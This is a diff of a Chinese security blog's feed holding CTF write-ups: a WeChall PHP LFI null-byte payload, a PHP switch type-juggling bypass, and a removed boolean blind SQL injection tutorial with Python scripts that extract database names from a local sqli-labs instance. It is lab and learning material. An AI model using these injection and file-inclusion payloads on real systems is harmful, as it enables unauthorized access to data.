+  &lt;li&gt;直接和我联系 ziishaned@gmail.com 或 &lt;a href=&quot;https://twitter.com/ziishaned&quot;&gt;&lt;img src=&quot;https://img.shields.io/twitter/url/https/twitter.com/ziishaned.svg?style=social&amp;amp;label=Follow%20%40ziishaned&quot; alt=&quot;Twitter URL&quot; /&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;许可证&quot;&gt;许可证&lt;/h2&gt;
+
+&lt;p&gt;MIT © &lt;a href=&quot;mailto:ziishaned@gmail.com&quot;&gt;Zeeshan Ahmed&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="regex" /><summary type="html">来自 github 上的正则表达式基础，特别好，一定要搞熟。原文链接 还有一篇正则表达式30分钟入门教程</summary></entry><entry><title type="html">wechall writeup</title><link href="http://localhost:4000/2018/08/19/wechall/" rel="alternate" type="text/html" title="wechall writeup" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/wechall</id><content type="html" xml:base="http://localhost:4000/2018/08/19/wechall/">&lt;p&gt;国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -588,7 +1245,27 @@ II &lt;a href=&quot;http://www.tianyancha.com&quot;&gt;天眼查 &lt;/a&gt;&lt;b
 #(?:exp) =&amp;gt; 匹配exp,不捕获匹配的文本，也不给此分组分配组号
 
 /^(wechall4?)\.(?:jpg|gif|tiff|png|bmp)$/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry><entry><title type="html">NCTF 综合题2</title><link href="http://localhost:4000/2018/08/19/nctfzh2/" rel="alternate" type="text/html" title="NCTF 综合题2" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/nctfzh2</id><content type="html" xml:base="http://localhost:4000/2018/08/19/nctfzh2/">&lt;p&gt;nctf 上的一道题目，需要挺多技巧的，感觉不错，所以单独拿出来分析一下。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;11training-php-lfi&quot;&gt;11.Training: PHP LFI&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;12php-0817&quot;&gt;12.PHP 0817&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?which=solution
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;switch 在这里会将 &lt;code class=&quot;highlighter-rouge&quot;&gt;solution&lt;/code&gt; 转换成 &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;， 从而绕过。&lt;/p&gt;
+
+&lt;h2 id=&quot;13training-crypto---transposition-i&quot;&gt;13.Training: Crypto - Transposition I&lt;/h2&gt;
+
+&lt;p&gt;到这里来&lt;a href=&quot;https://www.dcode.fr/transposition-cipher&quot;&gt;https://www.dcode.fr/transposition-cipher&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;BY KNOWING THE KEY LENGTH =&amp;gt; 选择 4&lt;/p&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry><entry><title type="html">NCTF 综合题2</title><link href="http://localhost:4000/2018/08/19/nctfzh2/" rel="alternate" type="text/html" title="NCTF 综合题2" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/nctfzh2</id><content type="html" xml:base="http://localhost:4000/2018/08/19/nctfzh2/">&lt;p&gt;nctf 上的一道题目，需要挺多技巧的，感觉不错，所以单独拿出来分析一下。
 &lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;step1-不断尝试&quot;&gt;step1 不断尝试&lt;/h2&gt;
@@ -1296,7 +1973,7 @@ IIS 6 曾经出过的漏洞，处理文件父文件夹如为&lt;code class=&quot
 &lt;h2 id=&quot;0x04-参考&quot;&gt;0x04 参考&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/hack0ne/p/4603144.html&quot;&gt;https://www.cnblogs.com/hack0ne/p/4603144.html&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://www.jianshu.com/p/d6c004e2f963&quot;&gt;https://www.jianshu.com/p/d6c004e2f963&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="00截断" /><summary type="html">这里主要总结和分析一下00截断的原理以及一些利用的场景，后续可能还会补充点。</summary></entry><entry><title type="html">NCTF writeup(Web)</title><link href="http://localhost:4000/2018/08/16/nctf_web/" rel="alternate" type="text/html" title="NCTF writeup(Web)" /><published>2018-08-16T00:00:00+08:00</published><updated>2018-08-16T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/16/nctf_web</id><content type="html" xml:base="http://localhost:4000/2018/08/16/nctf_web/">&lt;p&gt;这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……&lt;/p&gt;
+&lt;a href=&quot;https://www.jianshu.com/p/d6c004e2f963&quot;&gt;https://www.jianshu.com/p/d6c004e2f963&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="漏洞研究" /><summary type="html">这里主要总结和分析一下00截断的原理以及一些利用的场景，后续可能还会补充点。</summary></entry><entry><title type="html">NCTF writeup(Web)</title><link href="http://localhost:4000/2018/08/16/nctf_web/" rel="alternate" type="text/html" title="NCTF writeup(Web)" /><published>2018-08-16T00:00:00+08:00</published><updated>2018-08-16T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/16/nctf_web</id><content type="html" xml:base="http://localhost:4000/2018/08/16/nctf_web/">&lt;p&gt;这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -1916,290 +2593,4 @@ XX2: 目标数据字符串中字符的 ascii 码值
 
 &lt;h3 id=&quot;2-sqlmap&quot;&gt;2. sqlmap&lt;/h3&gt;
 
-&lt;p&gt;跟布尔盲注时一样，就不再赘述了。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="sql注入" /><summary type="html">记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。</summary></entry><entry><title type="html">布尔盲注的套路</title><link href="http://localhost:4000/2018/08/11/bool_ij/" rel="alternate" type="text/html" title="布尔盲注的套路" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/bool_ij</id><content type="html" xml:base="http://localhost:4000/2018/08/11/bool_ij/">&lt;p&gt;记录布尔盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-8(布尔型单引号GET盲注)。&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;0x01-预备&quot;&gt;0x01 预备&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-注入点判断&quot;&gt;1. 注入点判断&lt;/h3&gt;
-
-&lt;p&gt;先进行一些尝试&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1 ---&amp;gt; you are in~
-id=1' ---&amp;gt; 什么都没有回显  
-id=1'--+ ---&amp;gt; you are in~
-
-you are in~ 相当于回显了 true
-什么都没有回显 相当于回显了 false
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;2-盲注中常用-mysql-相关函数&quot;&gt;2. 盲注中常用 MySQL 相关函数&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;length(str): 返回str字符串的长度。
-substr(str, pos, len): 将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
-mid(str,pos,len): 跟上面的一样，截取字符串
-ascii(str): 返回字符串str的最左面字符的ASCII代码值。
-ord(str): 同上，返回ascii码
-if(a,b,c): a为条件，a为true，返回b，否则返回c，如if(1&amp;gt;2,1,0),返回0
-select database() 查询数据库
-ascii(substr((select database()),1,1)): 返回数据库名称的第一个字母,转化为ascii码
-ascii(substr((select database()),1,1))&amp;gt;64: ascii大于64就返回true，if就返回1，否则返回0
-
-常见的ASCII: A:65,Z:90 a:97,z:122, 0:48, 9:57
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x02--构造-payload&quot;&gt;0x02  构造 Payload&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-猜数据库长度&quot;&gt;1. 猜数据库长度&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and length(database())=X --+
-或
-id=1' and length(database())&amp;gt;=X --+  (主要方便使用二分法，提升一下效率)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and length(database())={} --+&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You are in&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; 
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;2-猜数据库名&quot;&gt;2. 猜数据库名&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select database()),XX1,XX2)))=XX3 --+
-或
-id=1' and (ascii(substr((select database()),XX1,XX2)))&amp;gt;=XX3 --+  (主要方便使用二分法，提升一下效率)
-
-XX1: 是数据库名称(字符串)不同的位置 1-8
-XX2: 截取的字符长度 1
-XX3: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and (ascii(substr((select database()),{},1)))={} --+&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You are in&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;采用二分法提高下效率：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and (ascii(substr((select database()),{},1)))&amp;gt;={} --+&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You are in&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;3猜表的长度&quot;&gt;3.猜表的长度&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit XX1,XX2)=XX3 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有表的长度
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 猜测的表的长度
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;4-猜表名&quot;&gt;4. 猜表名&lt;/h3&gt;
-
